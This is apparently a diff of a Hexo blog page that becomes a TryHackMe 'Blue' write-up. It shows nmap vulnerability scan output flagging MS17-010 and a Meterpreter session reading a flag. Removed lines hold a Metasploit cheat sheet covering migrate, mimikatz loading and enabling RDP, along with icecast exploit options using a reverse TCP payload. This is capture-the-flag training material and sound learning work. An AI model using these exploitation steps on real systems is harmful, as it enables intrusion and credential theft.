@@ -20,28 +20,34 @@
     var CONFIG = {"hostname":"0xdeciverangel.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="0xdeciverAngel">
-<meta property="og:url" content="https://0xdeciverangel.github.io/index.html">
+  <meta name="description" content="BlueStep1 Nmap scanfirst scan the mechine nnmap -sV -vv --script&#x3D;vuln 10.10.248.1 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe Room Blue">
+<meta property="og:url" content="https://0xdeciverangel.github.io/2021/06/09/TryHackMe-Room-Blue/index.html">
 <meta property="og:site_name" content="0xdeciverAngel">
+<meta property="og:description" content="BlueStep1 Nmap scanfirst scan the mechine nnmap -sV -vv --script&#x3D;vuln 10.10.248.1 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263">
 <meta property="og:locale" content="zh_TW">
+<meta property="article:published_time" content="2021-06-09T14:05:49.000Z">
+<meta property="article:modified_time" content="2021-06-09T14:09:15.040Z">
 <meta property="article:author" content="0xdeciverAngel">
+<meta property="article:tag" content="TryHackMe">
+<meta property="article:tag" content="Metasploit">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://0xdeciverangel.github.io/">
+<link rel="canonical" href="https://0xdeciverangel.github.io/2021/06/09/TryHackMe-Room-Blue/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-TW'
   };
 </script>
 
-  <title>0xdeciverAngel</title>
+  <title>TryHackMe Room Blue | 0xdeciverAngel</title>
   
 
 
@@ -149,9 +155,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
@@ -167,10 +174,9 @@
       <meta itemprop="name" content="0xdeciverAngel">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/06/09/TryHackMe-Room-Blue/" class="post-title-link" itemprop="url">TryHackMe Room Blue</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          TryHackMe Room Blue
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -203,7 +209,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <span id="more"></span>
+        <span id="more"></span>
 <h1 id="Blue"><a href="#Blue" class="headerlink" title="Blue"></a>Blue</h1><h2 id="Step1-Nmap-scan"><a href="#Step1-Nmap-scan" class="headerlink" title="Step1 Nmap scan"></a>Step1 Nmap scan</h2><p>first scan the mechine <code>nnmap -sV -vv --script=vuln 10.10.248.1</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-09 06:46 EDT</span><br><span class="line">NSE: Loaded 149 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 06:46</span><br><span class="line">NSE Timing: About 80.00% done; ETC: 06:46 (0:00:08)</span><br><span class="line">Completed NSE at 06:46, 34.22s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 06:46</span><br><span class="line">Completed NSE at 06:46, 0.00s elapsed</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     224.0.0.251</span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Initiating Ping Scan at 06:46</span><br><span class="line">Scanning 10.10.248.1 [2 ports]</span><br><span class="line">Completed Ping Scan at 06:46, 0.29s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 06:46</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 06:46, 0.01s elapsed</span><br><span class="line">Initiating Connect Scan at 06:46</span><br><span class="line">Scanning 10.10.248.1 [1000 ports]</span><br><span class="line">Discovered open port 445/tcp on 10.10.248.1</span><br><span class="line">Discovered open port 135/tcp on 10.10.248.1</span><br><span class="line">Discovered open port 139/tcp on 10.10.248.1</span><br><span class="line">Discovered open port 3389/tcp on 10.10.248.1</span><br><span class="line">Discovered open port 49153/tcp on 10.10.248.1</span><br><span class="line">Discovered open port 49152/tcp on 10.10.248.1</span><br><span class="line">Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 39.86% done; ETC: 06:47 (0:00:15 remaining)</span><br><span class="line">Discovered open port 49158/tcp on 10.10.248.1</span><br><span class="line">Increasing send delay for 10.10.248.1 from 0 to 5 due to max_successful_tryno increase to 4</span><br><span class="line">Increasing send delay for 10.10.248.1 from 5 to 10 due to 11 out of 22 dropped probes since last increase.</span><br><span class="line">Increasing send delay for 10.10.248.1 from 10 to 20 due to max_successful_tryno increase to 5</span><br><span class="line">Discovered open port 49154/tcp on 10.10.248.1</span><br><span class="line">Discovered open port 49160/tcp on 10.10.248.1</span><br><span class="line">Increasing send delay for 10.10.248.1 from 20 to 40 due to max_successful_tryno increase to 6                        </span><br><span class="line">Completed Connect Scan at 06:47, 48.79s elapsed (1000 total ports)                                                   </span><br><span class="line">Initiating Service scan at 06:47                                                                                     </span><br><span class="line">Scanning 9 services on 10.10.248.1</span><br><span class="line">Service scan Timing: About 55.56% done; ETC: 06:49 (0:00:48 remaining)</span><br><span class="line">Completed Service scan at 06:48, 65.04s elapsed (9 services on 1 host)</span><br><span class="line">NSE: Script scanning 10.10.248.1.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 06:48</span><br><span class="line">NSE: [firewall-bypass 10.10.248.1] lacks privileges.</span><br><span class="line">NSE Timing: About 99.91% done; ETC: 06:49 (0:00:00 remaining)</span><br><span class="line">Completed NSE at 06:49, 34.27s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 06:49</span><br><span class="line">NSE: [tls-ticketbleed 10.10.248.1:49152] Not running due to lack of privileges.</span><br><span class="line">NSE: [ssl-ccs-injection 10.10.248.1:3389] No response from server: TIMEOUT</span><br><span class="line">Completed NSE at 06:49, 10.45s elapsed</span><br><span class="line">Nmap scan report for 10.10.248.1</span><br><span class="line">Host is up, received conn-refused (0.32s latency).</span><br><span class="line">Scanned at 2021-06-09 06:46:49 EDT for 159s</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">Reason: 991 conn-refused</span><br><span class="line">PORT      STATE SERVICE            REASON  VERSION</span><br><span class="line">135/tcp   open  msrpc              syn-ack Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server? syn-ack</span><br><span class="line">| rdp-vuln-ms12-020: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2012-0152</span><br><span class="line">|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)</span><br><span class="line">|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2012-03-13</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152</span><br><span class="line">|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020</span><br><span class="line">|   </span><br><span class="line">|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2012-0002</span><br><span class="line">|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)</span><br><span class="line">|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2012-03-13</span><br><span class="line">|     References:</span><br><span class="line">|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002</span><br><span class="line">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">49152/tcp open  msrpc              syn-ack Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc              syn-ack Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc              syn-ack Microsoft Windows RPC</span><br><span class="line">49158/tcp open  msrpc              syn-ack Microsoft Windows RPC</span><br><span class="line">49160/tcp open  msrpc              syn-ack Microsoft Windows RPC</span><br><span class="line">Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 06:49</span><br><span class="line">Completed NSE at 06:49, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 06:49</span><br><span class="line">Completed NSE at 06:49, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 193.82 seconds</span><br></pre></td></tr></table></figure>
 <p>vuln service <code>smb-vuln-ms17-010</code></p>
@@ -219,139 +225,34 @@
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -f flag2.txt</span><br><span class="line">Found 1 result...</span><br><span class="line">    c:\Windows\System32\config\flag2.txt (34 bytes)</span><br><span class="line">meterpreter &gt; cd C:\\Windows </span><br><span class="line">cd C:\\Windows $Recycle.Bin                 cd C:\\Windows Program\ Files\ (x86)</span><br><span class="line">cd C:\\Windows Documents\ and\ Settings     cd C:\\Windows Recovery</span><br><span class="line">cd C:\\Windows PerfLogs                     cd C:\\Windows System\ Volume\ Information</span><br><span class="line">cd C:\\Windows ProgramData                  cd C:\\Windows Users</span><br><span class="line">cd C:\\Windows Program\ Files               cd C:\\Windows Windows</span><br><span class="line">meterpreter &gt; cd C:\\Windows </span><br><span class="line">cd C:\\Windows $Recycle.Bin                 cd C:\\Windows Program\ Files\ (x86)</span><br><span class="line">cd C:\\Windows Documents\ and\ Settings     cd C:\\Windows Recovery</span><br><span class="line">cd C:\\Windows PerfLogs                     cd C:\\Windows System\ Volume\ Information</span><br><span class="line">cd C:\\Windows ProgramData                  cd C:\\Windows Users</span><br><span class="line">cd C:\\Windows Program\ Files               cd C:\\Windows Windows</span><br><span class="line">meterpreter &gt; cd C:\\Windows </span><br><span class="line">cdmeterpreter &gt; cd System32</span><br><span class="line">meterpreter &gt; cd config</span><br><span class="line">cdmeterpreter &gt; cat flag2.txt </span><br><span class="line">flag&#123;sam_database_elevated_access&#125;meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/TryHackMe/" rel="tag"># TryHackMe</a>
+              <a href="/tags/Metasploit/" rel="tag"># Metasploit</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
-    <link itemprop="mainEntityOfPage" href="https://0xdeciverangel.github.io/2021/06/08/TryHackMe-Room-Metasploit/">
+        
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/31663805?v=4">
-      <meta itemprop="name" content="0xdeciverAngel">
-      <meta itemprop="description" content="">
-    </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="0xdeciverAngel">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/06/08/TryHackMe-Room-Metasploit/" class="post-title-link" itemprop="url">TryHackMe Room Metasploit</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">發表於</span>
-
-              <time title="創建時間：2021-06-08 06:46:01" itemprop="dateCreated datePublished" datetime="2021-06-08T06:46:01-04:00">2021-06-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新於</span>
-                <time title="修改時間：2021-06-09 09:59:39" itemprop="dateModified" datetime="2021-06-09T09:59:39-04:00">2021-06-09</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分類於</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Pentest/" itemprop="url" rel="index"><span itemprop="name">Pentest</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <span id="more"></span>
-
-<h1 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h1><ul>
-<li>msfconsole<h2 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h2></li>
-<li>msfdb init<ul>
-<li>db_status</li>
-<li>help</li>
-<li>search</li>
-<li>use</li>
-<li>info</li>
-<li>connect</li>
-<li>set</li>
-<li>setg</li>
-<li>get</li>
-<li>spool</li>
-<li>save</li>
-<li>load</li>
-<li>db_nmap -sV ip</li>
-<li>jobs</li>
-<li>use ??</li>
-<li>sessions</li>
-<li>run or exploit</li>
-<li>getuid</li>
-<li>migrate</li>
-<li>sysinfo </li>
-<li>upload</li>
-<li>getprivs</li>
-<li>ipconfig</li>
-<li>ps</li>
-<li>run /post/windows/gather/checkvm</li>
-<li>run post/multi/recon/local_exploit_suggester</li>
-<li>run autoroute -n ip mask</li>
-<li>bg</li>
-<li>run post/windows/manage/enable_rdp</li>
-<li>sessions -i 0</li>
-</ul>
-</li>
-</ul>
-<h2 id="task"><a href="#task" class="headerlink" title="task"></a>task</h2><p>First scan port <code>db_namp -sV ip</code><br>check<code>vlun</code> or <code>host</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/http/icecast_header) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/http/icecast_header):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  10.10.107.162    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT   8000             yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpresearch server/socks5ter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.8.9.197       yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>then run attack,then you will get a shell</p>
-<p>run <code>ps</code> get the pid of <code>spoolsv.exe.</code>,run <code>migrate &#123;pid&#125;</code></p>
-<p>it will tell you <code>insufficient privileges</code> ,use <code>getuid</code> or <code>sysinfo</code></p>
-<p>run <code>load kiwi</code> to load mimikatz</p>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/08/TryHackMe-Room-Metasploit/" rel="prev" title="TryHackMe Room Metasploit">
+      <i class="fa fa-chevron-left"></i> TryHackMe Room Metasploit
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-
   
 
 
@@ -404,6 +305,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Blue"><span class="nav-number">1.</span> <span class="nav-text">Blue</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Step1-Nmap-scan"><span class="nav-number">1.1.</span> <span class="nav-text">Step1 Nmap scan</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step2-Metasploit"><span class="nav-number">1.2.</span> <span class="nav-text">Step2 Metasploit</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
